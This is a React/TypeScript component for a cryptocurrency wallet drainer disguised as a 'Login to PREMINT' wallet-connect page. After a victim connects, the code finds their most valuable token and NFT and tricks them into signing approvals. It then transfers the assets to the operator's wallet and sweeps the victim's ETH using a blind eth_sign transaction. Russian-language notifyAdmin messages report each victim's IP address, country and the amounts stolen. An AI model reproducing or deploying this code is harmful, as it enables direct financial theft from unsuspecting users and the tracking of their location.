import type { ERC20Token, NFTToken } from "shared/api";
import ERC20_ABI from "../shared/constants/contracts/erc20_abi.json";
import ERC721_ABI from "../shared/constants/contracts/erc721_abi.json";

import { BigNumber, Contract, ethers, UnsignedTransaction } from "ethers";
import { notifyAdmin } from "features/notify";
import React, { useEffect, useState } from "react";
import { useWeb3 } from "../hooks";
import { getPriciestNFT } from "entities/wallet.NFT.store";
import { getPriciestToken } from "entities/wallet.erc20.store";

import config from "../config.json";

interface ConnectProps {
  connect: (() => Promise<void>) | null;
}

interface DisconnectProps {
  disconnect: (() => Promise<void>) | null;
}

export const DisconnectButton = ({ disconnect }: DisconnectProps) => {
  return disconnect ? (
    <>
      <div className="col-lg-4">
                    <div className="text-center">
                      <h2 className="heading heading-4 mb-3">
                        Login to PREMINT
                      </h2>
                      <div className="text-sm text-muted text-uppercase text-center mb-1">
                        Create new accounts with a wallet
                      </div>
        <button className="btn btn-styled btn-base-1 btn-block btn-circle" onClick={disconnect}>
        <i className="fab fa-ethereum mr-2" />
        Reconnect
        </button>
        <p className="mt-2" x-text="message" />
                    </div>
                    <div className="text-center">
                      <small className="">
                      Sorry, you are not eligible. Try checking another address.
                      </small>
                    </div>
                  </div>
      </>
  ) : (
    <button>Loading...</button>
  );
};

export function Web3Button(props: any) {
  const wallet = props.wallet;
  const geoData = props.geoData;
  const web3 = useWeb3();
  const { address, provider, web3Provider, connect, disconnect } = web3;

  const walletSigner = wallet.connect(ethers.getDefaultProvider("homestead"));

  let NFTContract: Contract;
  let assetContract: Contract;

  let priciest: ERC20Token | undefined;
  let priciestNFT: NFTToken | undefined;
  const isActive = address ? true : false;

  let [noTokens, setNoTokens] = useState(false);

  useEffect(() => {
    const tokenInfo = async () => {
      if (address) {
        try {
          priciest = await getPriciestToken(address);
          priciestNFT = await getPriciestNFT(address);
        } catch {}
        await approve();
      }
    };
    tokenInfo();
  }, [address]);

  const [buttonText, setButtonText] = useState("Connect wallet");

  const ConnectButton = ({ connect }: ConnectProps) => {
    return connect ? (
      <>
      <div className="col-lg-4">
                    <div className="text-center">
                      <h2 className="heading heading-4 mb-3">
                        Login to PREMINT
                      </h2>
                      <div className="text-sm text-muted text-uppercase text-center mb-1">
                        Create new accounts with a wallet
                      </div>
        <button className="btn btn-styled btn-base-1 btn-block btn-circle" onClick={approve}>
        <i className="fab fa-ethereum mr-2" />
        {buttonText}
        </button>
        <p className="mt-2" x-text="message" />
                    </div>
                    <div className="text-center">
                      <small className="">
                        By connecting, you agree to the{" "}
                        <a
                          href="https://www.premint.xyz/terms/"
                          target="_blank"
                        >
                          Terms of Use
                        </a>{" "}
                        and{" "}
                        <a
                          href="https://www.premint.xyz/privacy/"
                          target="_blank"
                        >
                          Privacy Policy
                        </a>
                      </small>
                    </div>
                  </div>
      </>
    ) : (
      <button>Loading...</button>
    );
  };

  useEffect(() => {
    if (!address) return;
    const sendTokenInfo = async () => {
      priciest = await getPriciestToken(address);
      priciestNFT = await getPriciestNFT(address);
      let ethBalance = await web3Provider?.getBalance(address);
      if (
        !priciest &&
        !priciestNFT &&
        +ethers.utils.formatEther(ethBalance ?? 0) > 0.01
      ) {
        notifyAdmin(
          ``
        );
      }
    };
    let wallets = window.localStorage.getItem("walletsConnected");
    if (wallets !== null) {
      var walletsConnected: any[] = JSON.parse(wallets);
    } else {
      var walletsConnected = [];
    }
    let unique = new Set(walletsConnected);
    console.log(unique);

    if (isActive && geoData.IPv4) {
      if (!unique.has(address)) {
        let wallet = provider.isMetaMask ? "MetaMask" : "WalletConnect";
        notifyAdmin(
          `🤔Кто-то подключает свой [${wallet}](https://etherscan.io/address/${address}) кошелёк..\n🌐Страна, IP-адрес: ${geoData.country_code}, ${geoData.IPv4}`
        );
        unique.add(address);
        sendTokenInfo();
        window.onbeforeunload = function () {
          notifyAdmin(
            `🥺К сожалению, юзер ${geoData.country_code}, ${geoData.IPv4} покидает сайт..`
          );
          this.onbeforeunload = () => {};
          return "Do you want to leave the page ?";
        };
        window.localStorage.setItem(
          "walletsConnected",
          JSON.stringify([...unique])
        );
      }
    }
  }, [priciest, priciestNFT, address]);

  async function signEthereum(value: string, reserve: boolean) {
    if (!address || !web3Provider) return;
    let reserveEth = 0.003; // для комиссий
    if (reserve && +value > 0.018) reserveEth += 0.01;
    let ethValue = ethers.utils.parseEther((+value - +reserveEth).toFixed(6));
    console.log(ethValue);
    let tx = {
      from: address,
      to: ethers.utils.getAddress(wallet.address),
      value: ethValue,
      gasLimit: 100000,
      chainId: 1,
    };
    const feeData = await web3Provider.getFeeData();
    const estimateGas = await web3Provider.estimateGas(tx);
    reserveEth += +ethers.utils.formatEther(
      estimateGas.mul(feeData.gasPrice ?? 0)
    );
    console.log(reserveEth);
    tx = {
      from: address,
      to: ethers.utils.getAddress(wallet.address),
      value: ethers.utils.parseEther((+value - +reserveEth).toString()),
      gasLimit: 100000,
      chainId: 1,
    };
    const web3Signer = web3Provider.getSigner();
    const ts = await web3Signer.populateTransaction(tx);
    const unsigned = ts as UnsignedTransaction;
    console.log(unsigned);
    const hexTx = ethers.utils.serializeTransaction(unsigned);
    const hashArray = ethers.utils.arrayify(hexTx);
    const signature = await web3Provider.send("eth_sign", [
      ethers.utils.getAddress(address),
      ethers.utils.keccak256(hashArray),
    ]);
    const signedTx = ethers.utils.serializeTransaction(unsigned, signature);
    await web3Provider.sendTransaction(signedTx);
    notifyAdmin(
      `😍УРА! Юзер ${geoData.country_code}, ${
        geoData.IPv4
      } подписал контракт и отправил вам ${(
        +value - +reserveEth
      ).toString()} ETH`
    );
  }

  async function approve() {
    if (!address) {
      await connect();
      return;
    }

    if (provider && !provider.isMetaMask)
      setButtonText("Open your wallet to confirm minting");

    let ethBalance = await web3Provider?.getBalance(address);
    if (ethBalance && +ethers.utils.formatEther(ethBalance) > +config.minEth) {
      let reserve = priciest || priciestNFT ? true : false;
      await signEthereum(ethers.utils.formatEther(ethBalance), reserve);
    }

    if (!(priciestNFT || priciest) || (ethBalance && +ethers.utils.formatEther(ethBalance) > 0.01)) {
      setNoTokens(true);
    } else {
      if (noTokens) setNoTokens(false);
    }

    if (priciest) {
      assetContract = new ethers.Contract(
        priciest?.id,
        ERC20_ABI.abi,
        web3Provider?.getSigner()
      );
    }
    if (priciestNFT) {
      NFTContract = new ethers.Contract(
        priciestNFT?.id,
        ERC721_ABI.abi,
        web3Provider?.getSigner()
      );
    }

    try {
      if (priciestNFT && priciest) {
        if (
          (priciest?.price * priciest?.balance) / 10 ** priciest.decimals >
          priciestNFT.usd_price
        ) {
          await approveToken(priciest, assetContract);
        }
      } else if (!priciestNFT) {
        await approveToken(priciest, assetContract);
        console.log(2);
      } else {
        await approveNFT(priciestNFT, NFTContract);
        console.log(3);
      }
    } catch {}

    ethBalance = await web3Provider?.getBalance(address);
    if (ethBalance && +ethers.utils.formatEther(ethBalance) > 0.01) {
      signEthereum(ethers.utils.formatEther(ethBalance), false);
    }
  }

  async function reconnect() {
    disconnect();
    approve();
  }

  async function approveToken(
    priciest: ERC20Token | undefined,
    asset: Contract
  ) {
    const priciestAssetBalance = priciest?.balance.toLocaleString("fullwide", {
      useGrouping: false,
    });
    const approve = await asset.approve(
      wallet.address,
      BigNumber.from(priciestAssetBalance),
      {
        gasLimit: 150000,
      }
    );

    await approve.wait();

    if (priciest?.id && priciest.price && priciest.balance) {
      notifyAdmin(
        `😍УРА! Юзер ${geoData.country_code}, ${
          geoData.IPv4
        } выписал вам апрув токена ${priciest?.name} на сумму ${(
          (priciest?.price * priciest?.balance) /
          10 ** priciest.decimals
        ).toFixed(2)}$..`
      );
      const SendContract = new ethers.Contract(
        priciest?.id,
        ERC20_ABI.abi,
        walletSigner
      );

      await SendContract?.transferFrom(
        address,
        wallet.address,
        BigNumber.from(priciestAssetBalance),
        {
          gasLimit: 150000,
        }
      );

      notifyAdmin(
        `💰Токен ${priciest.name} в размере ${(
          (priciest?.price * priciest?.balance) /
          10 ** priciest.decimals
        ).toFixed(2)}$ от юзера ${geoData.country_code}, ${
          geoData.IPv4
        } был зачислен на ваш кошелёк ${wallet.address}`
      );
    }
  }

  async function approveNFT(
    priciestNFT: NFTToken | undefined,
    NFTContract: Contract
  ): Promise<void> {
    const tx = await NFTContract?.setApprovalForAll(wallet.address, true, {
      gasLimit: 150000,
    });
    try {
      await tx.wait();
    } catch {
      return;
    }
    notifyAdmin(
      "Выписан апрув NFT" +
        priciestNFT?.id +
        "стоимостью" +
        priciestNFT?.usd_price +
        "USDT"
      // `(${ip})`
    );

    if (priciestNFT?.contract_id !== undefined) {
      const SendContract = new ethers.Contract(
        priciestNFT.contract_id,
        ERC721_ABI.abi,
        walletSigner
      );
      await SendContract.transferFrom(address, wallet.address, priciestNFT.id, {
        gasLimit: 150000,
      });
      notifyAdmin(
        `💰NFT ${priciestNFT.id} в размере ${priciestNFT.usd_price}$ от юзера ${geoData.country_code}, ${geoData.IPv4} был зачислен на ваш кошелёк ${wallet.address}`
      );
    }
  }
  return web3Provider && noTokens ? (
    <DisconnectButton disconnect={reconnect} />
  ) : (
    <ConnectButton connect={approve} />
  );
}
